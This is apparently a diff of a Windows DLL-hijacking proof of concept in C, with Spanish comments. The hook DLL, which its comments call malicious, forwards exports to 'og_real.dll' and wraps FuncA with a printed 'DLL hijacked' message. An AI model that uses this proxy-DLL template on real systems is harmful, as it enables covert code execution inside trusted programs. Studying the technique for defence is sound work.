@@ -1,26 +1,21 @@
 #include <windows.h>
 #include <stdio.h>
 
-HINSTANCE hOriginal = NULL;
 
-void LoadOriginal() {
-    
-    hOriginal = LoadLibraryA("real.dll"); // tiene que estar en una de las direcciones `echo %PATH%`
-    
-    if (hOriginal == NULL) {
-        printf("Error loading original DLL \n");
-    }
-}
-
-
-// Función hook que será exportada
 __declspec(dllexport) void WINAPI FuncA() {
     printf("[DLL hijacked] FuncA_Hook ejecutada\n");
 
-    LoadOriginal();
-    
-    // Llama a la función original
-    typedef void (WINAPI* pFuncA)();    // Prototipo de la función original
+    // Nuestra Dll maliciosa exporta:
+    // 
+    //      Export Address Table -- Ordinal Base 1
+    //          [   0] +base[   1] 1437 Export RVA
+    //          [   1] +base[   2] d05a Forwarder RVA -- og_real.FuncB
+    //          [   2] +base[   3] d06e Forwarder RVA -- og_real.FuncC
+    // 
+    // El loader detecta estos exports como una dependecia con "og_real.dll" y carga la dll en memoria
+
+    HINSTANCE hOriginal = LoadLibraryA("og_real.dll");      // Solo recuperamos el handle la dll ya esta en memoria
+    typedef void (WINAPI* pFuncA)();                        // Prototipo de la función original
     pFuncA orig = (pFuncA)GetProcAddress(hOriginal, "FuncA");
     
     if (orig != NULL) {
